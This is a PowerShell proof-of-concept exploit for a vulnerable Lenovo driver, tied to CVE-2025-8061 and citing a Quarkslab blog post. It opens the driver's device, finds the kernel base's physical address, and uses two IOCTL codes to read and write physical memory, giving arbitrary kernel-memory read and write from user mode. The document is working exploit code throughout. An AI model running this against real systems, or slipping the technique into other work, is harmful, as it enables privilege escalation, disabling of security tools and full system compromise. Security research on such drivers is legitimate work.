Clear-Host
Write-Host

# BYOVD to the next level (part 1) — exploiting a vulnerable driver (CVE-2025-8061) - Quarkslab's blog
# https://blog.quarkslab.com/exploiting-lenovo-driver-cve-2025-8061.html

$VA = Get-KernelBaseAddress -Method Query
$PA = Convert-VirtualToPhysical -VirtualAddress $VA

$Size_To_Read = 4
$Size_Ceiling = [Math]::Max(16, [int]([Math]::Ceiling($Size_To_Read / 8.0) * 8))

try {
  
  $Data_Buffer  = $null
  $hDevice = Get-FileHandle -FileName LnvMSRIO -AlternativeName WinMsrDev

  # ~~~~~~~~~ @
  # Read Case @
  # ~~~~~~~~~ @

  try {
    $InOutPtr   = New-IntPtr -Size $Size_Ceiling -TypeSize ([Int64], [Int32], [Int32]) -Values ($PA, 8, ($Size_Ceiling/8))
    $InvokeCall = Invoke-IoctlCall -Mode 1 -FileHandle $hDevice -IoCtrlCode 0x9c406104 -InOutPtr $InOutPtr -InputSize 0x10 -OutputSize $Size_Ceiling
    [String]::Format("DeviceIO Read Call --> {0} (Bytes Returned: {1})", $InvokeCall.Success, $InvokeCall.BytesRet)
    if ($InvokeCall.Success) {
      Write-Host
      $Data_Buffer = [Byte[]]::new($Size_To_Read)
      [marshal]::Copy($InOutPtr, $Data_Buffer, 0, $Size_To_Read)
      $Data_Buffer | Format-HexView -Mode 8x
    }
  } finally {
      Free-IntPtr $InOutPtr  -Method Auto
  }

  # ~~~~~~~~~~ @
  # Write Case @
  # ~~~~~~~~~~ @

  if ($Data_Buffer) {
      try {

      $BufferLen   = $Data_Buffer.Length
      $StructLen   = 0x10 + $BufferLen
      $InOutBuffer = [Byte[]]::new($StructLen)

      # Choose UnitSize based on alignment (2 for WORDs, 1 for BYTES)
      $UnitSize    = if ($BufferLen % 2 -eq 0) { 2 } else { 1 }
      $UnitCount   = $BufferLen / $UnitSize

      # Pack the 16-byte header
      [BitConverter]::GetBytes([UInt64]$PA).CopyTo($InOutBuffer, 0)
      [BitConverter]::GetBytes([UInt32]$UnitSize).CopyTo($InOutBuffer, 8)
      [BitConverter]::GetBytes([UInt32]$UnitCount).CopyTo($InOutBuffer, 12)

      # Copy payload data
      [Array]::Copy($Data_Buffer, 0, $InOutBuffer, 16, $BufferLen)

      $InOutPtr   = New-IntPtr -Data $InOutBuffer
      $InvokeCall = Invoke-IoctlCall -IoCtrlCode 0x9c40a108 -Mode 1 -FileHandle $hDevice -InOutPtr $InOutPtr -InputSize $StructLen -OutputSize 0

      Write-Host
      [String]::Format("DeviceIO Write Call --> {0} (Bytes Returned: {1})", $InvokeCall.Success, $InvokeCall.BytesRet)

    } finally {
      Free-IntPtr $InOutPtr
    }
}

} finally {
  Free-IntPtr $hDevice   -Method NtHandle
}